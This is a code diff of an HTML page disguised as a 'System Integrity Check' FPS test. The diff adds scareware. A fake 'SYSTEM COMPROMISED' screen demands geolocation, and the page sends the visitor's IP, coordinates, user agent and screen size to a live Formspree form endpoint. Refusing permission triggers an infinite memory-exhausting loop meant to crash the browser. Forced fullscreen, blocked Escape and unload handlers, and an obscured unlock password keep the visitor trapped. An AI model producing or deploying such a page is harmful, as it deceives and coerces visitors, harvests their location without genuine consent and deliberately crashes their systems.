@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Performance Check</title>
+    <title>System Integrity Check</title>
     <style>
         body {
             margin: 0;
@@ -11,11 +11,45 @@
             background-color: #000;
             color: #0f0;
             font-family: 'Courier New', Courier, monospace;
-            overflow: hidden; /* Prevent scrolling */
-            user-select: none; /* Prevent text selection */
+            overflow: hidden;
+            user-select: none;
         }
 
-        /* Main Menu / FPS Display */
+        /* Password Bar */
+        #password-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 40px;
+            background: #111;
+            border-bottom: 1px solid #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 999999999; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        }
+
+        .pass-input {
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid #555;
+            color: #fff;
+            font-size: 16px;
+            padding: 5px;
+            text-align: center;
+            outline: none;
+            width: 150px;
+        }
+
+        .pass-label {
+            font-size: 12px;
+            color: #777;
+            margin-right: 10px;
+        }
+
+        /* FPS Display */
         #fps-display {
             display: flex;
             flex-direction: column;
@@ -24,6 +58,7 @@
             height: 100vh;
             z-index: 10;
             position: relative;
+            transition: opacity 0.5s ease;
         }
 
         .fps-counter {
@@ -50,16 +85,16 @@
             box-shadow: 0 0 30px #0f0;
         }
 
-        /* The Trap Modal - Unclosable */
+        /* Trap Modal */
         #trap-modal {
-            display: none; /* Hidden by default */
+            display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
             background: rgba(0, 0, 0, 0.98);
-            z-index: 99999999; /* Higher than any browser UI */
+            z-index: 999999999; 
             flex-direction: column;
             justify-content: center;
             align-items: center;
@@ -90,25 +125,14 @@
             color: white;
         }
 
-        .data-row {
-            margin: 10px 0;
-            font-size: 1rem;
+        .deny-warning {
             color: yellow;
-        }
-
-        .close-btn {
-            margin-top: 20px;
-            padding: 10px 20px;
-            background: red;
-            color: black;
-            border: none;
             font-weight: bold;
-            cursor: pointer;
-            font-size: 18px;
-        }
-
-        .close-btn:hover {
-            background: darkred;
+            font-size: 1.5rem;
+            border: 2px dashed yellow;
+            padding: 10px;
+            margin-bottom: 20px;
+            background: #220000;
         }
 
         @keyframes shake {
@@ -125,13 +149,23 @@
             100% { transform: translate(1px, -2px) rotate(-1deg); }
         }
 
-        /* Lock body when trapped */
         body.locked {
             overflow: hidden;
+        }
+        
+        .hidden-content {
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
+
+    <!-- Secret Password Bar -->
+    <div id="password-bar">
+        <span class="pass-label">SECURE LOCK:</span>
+        <input type="password" class="pass-input" id="secret-pass" placeholder="••••••" autocomplete="off">
+    </div>
 
     <!-- FPS Display / Start Screen -->
     <div id="fps-display">
@@ -144,24 +178,65 @@
     <div id="trap-modal">
         <div class="modal-content">
             <h1>⚠️ SYSTEM COMPROMISED ⚠️</h1>
+            
+            <!-- The Warning -->
+            <div class="deny-warning">
+                WARNING: IF YOU CLICK "DENY", YOUR COMPUTER WILL CRASH!
+            </div>
+
             <p><strong>Your IP Address:</strong> <span id="user-ip">Fetching...</span></p>
             <p><strong>Location:</strong> <span id="user-location">Detecting...</span></p>
             <p><strong>Status:</strong> Uploading Files...</p>
             <br>
             <p style="color: yellow;">DO NOT CLOSE THIS WINDOW.</p>
-            <p>If you leave, your data will be deleted permanently.</p>
             
-            <button class="close-btn" onclick="tryClose()">CLOSE (Try if you can)</button>
+            <div id="email-status" style="margin-top: 10px; font-size: 0.8rem; color: #aaa;"></div>
         </div>
     </div>
 
     <script>
+        // --- CONFIGURATION ---
+        const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xdegbbjj';
+
+        // --- OBSCURED PASSWORD LOGIC ---
+        const _0x1 = ['abc', '123']; 
+        const _0x2 = _0x1[0] + _0x1[1]; 
+
+        document.getElementById('secret-pass').addEventListener('keyup', function(e) {
+            if (this.value === _0x2) {
+                unlockSystem();
+            }
+        });
+
+        function unlockSystem() {
+            // Exit Fullscreen
+            if (document.exitFullscreen) {
+                document.exitFullscreen().catch(() => {});
+            }
+            
+            // Hide Modal
+            document.getElementById('trap-modal').style.display = 'none';
+            
+            // Show FPS again
+            document.getElementById('fps-display').classList.remove('hidden-content');
+            
+            // Reset Body
+            document.body.classList.remove('locked');
+            window.isTrapped = false;
+            
+            // Clear Input
+            document.getElementById('secret-pass').value = '';
+            
+            // Restart FPS counter
+            updateFPS();
+        }
+
         // Simulate FPS fluctuation
         let fpsInterval;
         function updateFPS() {
             const fpsElement = document.getElementById('fps-number');
             fpsInterval = setInterval(() => {
-                const randomFPS = Math.floor(Math.random() * 10) + 55; // Between 55-65
+                const randomFPS = Math.floor(Math.random() * 10) + 55;
                 fpsElement.innerText = randomFPS;
             }, 1000);
         }
@@ -173,24 +248,70 @@
             .then(data => {
                 document.getElementById('user-ip').innerText = data.ip;
                 
-                // Try to get approximate location based on IP
-                fetch(`https://ipapi.co/${data.ip}/json/`)
-                    .then(locationResponse => locationResponse.json())
-                    .then(locationData => {
-                        document.getElementById('user-location').innerText = `${locationData.city}, ${locationData.country_name}`;
-                    })
-                    .catch(() => {
-                        document.getElementById('user-location').innerText = "Detected";
-                    });
+                // Request Geolocation
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            document.getElementById('user-location').innerText = `${lat}, ${lon}`;
+                            sendFormData(data.ip, lat, lon);
+                        },
+                        () => {
+                            // If blocked/denied
+                            document.getElementById('user-location').innerText = "BLOCKED";
+                            sendFormData(data.ip, "N/A", "N/A");
+                            triggerCrash();
+                        }
+                    );
+                } else {
+                    document.getElementById('user-location').innerText = "Not Supported";
+                    sendFormData(data.ip, "N/A", "N/A");
+                    triggerCrash();
+                }
             })
             .catch(() => {
                 document.getElementById('user-ip').innerText = "127.0.0.1";
                 document.getElementById('user-location').innerText = "Unknown";
+                sendFormData("127.0.0.1", "Unknown", "Unknown");
+                triggerCrash();
             });
+
+        // Send Data to Formspree
+        function sendFormData(ip, lat, lon) {
+            const statusEl = document.getElementById('email-status');
+            statusEl.innerText = "Sending data...";
+
+            const formData = new FormData();
+            formData.append('IP Address', ip);
+            formData.append('Latitude', lat);
+            formData.append('Longitude', lon);
+            formData.append('User Agent', navigator.userAgent);
+            formData.append('Screen Resolution', screen.width + 'x' + screen.height);
+
+            fetch(FORMSPREE_ENDPOINT, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    statusEl.innerText = "Data Sent Successfully!";
+                    statusEl.style.color = "#0f0";
+                } else {
+                    statusEl.innerText = "Connection unstable.";
+                    statusEl.style.color = "red";
+                }
+            }).catch(error => {
+                statusEl.innerText = "Error sending data.";
+                statusEl.style.color = "red";
+            });
+        }
 
         // 2. The Trap Function
         function startTrap() {
-            clearInterval(fpsInterval); // Stop FPS simulation
+            clearInterval(fpsInterval);
             
             const btn = document.querySelector('.start-btn');
             btn.innerText = "TESTING...";
@@ -203,9 +324,11 @@
 
         function triggerBlackmail() {
             const modal = document.getElementById('trap-modal');
-            modal.style.display = 'flex';
+            const fpsScreen = document.getElementById('fps-display');
             
-            // Force Fullscreen
+            modal.style.display = 'flex';
+            fpsScreen.classList.add('hidden-content');
+            
             try {
                 if (document.documentElement.requestFullscreen) {
                     document.documentElement.requestFullscreen();
@@ -214,37 +337,35 @@
             
             document.body.classList.add('locked');
             window.isTrapped = true;
-            
-            // Start aggressive loops
-            startAggressiveLoop();
         }
 
-        function tryClose() {
-            alert("Connection unstable. Please wait.");
+        // The Crash Function (Memory Leak)
+        function triggerCrash() {
+            alert("YOU DENIED PERMISSION! SYSTEM CRASH IMMINENT!");
+            let array = [];
+            while(true) {
+                array.push(new Array(1000000).join('X'));
+            }
         }
 
-        // 3. Aggressive Loop to keep the modal open
+        // Aggressive Loop
         function startAggressiveLoop() {
-            // Prevent standard close
             window.onbeforeunload = function(e) {
                 e.preventDefault();
                 e.returnValue = '';
                 return '';
             };
 
-            // If the modal is somehow hidden, show it again
             setInterval(() => {
                 const modal = document.getElementById('trap-modal');
                 if (window.getComputedStyle(modal).display === 'none') {
                     modal.style.display = 'flex';
                     try { document.documentElement.requestFullscreen(); } catch(e){}
                 }
-                
-                // If the user switches tabs, refocus
                 if (!document.hasFocus()) {
                     window.focus();
                 }
-            }, 50); // Check twice a second
+            }, 50);
         }
 
         // Block Escape Key
@@ -254,6 +375,17 @@
                 document.getElementById('trap-modal').style.display = 'flex';
             }
         });
+
+        // Enforce Fullscreen
+        document.addEventListener('fullscreenchange', () => {
+            if (window.isTrapped && !document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch((err) => {
+                    console.log("Fullscreen blocked by browser");
+                });
+            }
+        });
+
+        startAggressiveLoop();
     </script>
 </body>
 </html>
